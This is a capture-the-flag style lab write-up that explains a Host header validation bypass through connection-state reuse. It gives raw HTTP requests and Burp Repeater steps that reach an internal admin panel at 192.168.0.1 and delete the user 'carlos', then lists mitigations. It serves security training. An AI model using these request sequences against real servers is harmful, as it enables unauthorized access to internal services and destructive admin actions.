# Host Validation Bypass via Connection State Attack

## 1. Definition

A **Host Validation Bypass via Connection State Attack** occurs when a server or proxy validates the `Host` header on the first request of 
an HTTP connection but incorrectly trusts subsequent requests on the same connection without revalidating their `Host` headers.



This can allow an attacker to route requests to internal services even when a direct request with a modified `Host` header is rejected.



## 2. Root Cause



The root cause is incorrect reliance on connection state and the initial request instead of independently validating every request.


In this lab:

- A normal request to the lab returned `200 OK`.

- A standalone request to `/admin` with `Host: 192.168.0.1` returned `301 Moved Permanently`.

- The successful exploitation relied on sending the legitimate request and the internal-host request sequentially over the **same HTTP 
connection**.



**Core concept:** Validating the first request does not make subsequent requests on the connection inherently trustworthy.



## 3. Lab Goal



Access the internal admin panel at:



`192.168.0.1/admin`



Then delete the user `carlos`.


## 4. Exploitation Steps



### Step 1 — Test Host Validation



Send a normal request to the lab's home page:



```http

GET / HTTP/1.1

Host: <LAB-DOMAIN>

Connection: keep-alive

```



The server returns `200 OK` and includes:



```http

Keep-Alive: timeout=10


```


This indicates that the HTTP connection may remain open for a limited period.

### Step 2 — Attempt Direct Access to the Admin Panel



Try:


```http

GET /admin HTTP/1.1

Host: 192.168.0.1


Connection: keep-alive

```



The server returns `301 Moved Permanently`, redirects to the lab's canonical domain, and closes the connection.




Therefore, changing the `Host` header in a standalone request is insufficient.


### Step 3 — Prepare Two Requests in Burp Repeater



Create a group containing two requests.




**Request 1 — Legitimate Request**





```http

GET / HTTP/1.1

Host: <LAB-DOMAIN>

Connection: keep-alive

```



**Request 2 — Internal Admin Request**



```http

GET /admin HTTP/1.1

Host: 192.168.0.1

Connection: keep-alive

```


Replace `<LAB-DOMAIN>` with the actual lab domain.




### Step 4 — Send Both Requests over a Single Connection



In Burp Repeater, select:



`Send group in sequence (single connection)`




This sends the requests sequentially over the same HTTP connection instead of creating a separate connection for each request.



The exploit takes advantage of the server's incorrect handling of connection state to bypass Host validation and access the internal admin 

panel.


### Step 5 — Extract the Deletion Form Details

After accessing the admin panel, inspect the deletion form and obtain the required CSRF token and target username.



### Step 6 — Delete the Target User


Modify the second request:




```http

POST /admin/delete HTTP/1.1

Host: 192.168.0.1

Content-Type: application/x-www-form-urlencoded

Connection: keep-alive



csrf=<CSRF-TOKEN>&username=carlos

```




Replace `<CSRF-TOKEN>` with the actual token extracted from the form. Preserve any required cookies and headers.




Send both requests again sequentially over the same connection. The user `carlos` is deleted, and the lab is solved.




## 5. Key Takeaways




- Changing the `Host` header alone may not be sufficient.

- Understand the difference between a standalone request and sequential requests over the same HTTP connection.

- `Send group in sequence (single connection)` is essential to this lab's exploitation technique.

- The CSRF token is required for the deletion action but is not the root cause of the vulnerability.

- The vulnerability arises from incorrect Host validation associated with connection state.





## 6. Mitigation



- Validate the `Host` header on every request.

- Never trust subsequent requests solely because the connection's first request was validated.

- Apply consistent validation and routing rules across proxies and back-end servers.

- Reject requests targeting unauthorized internal hosts.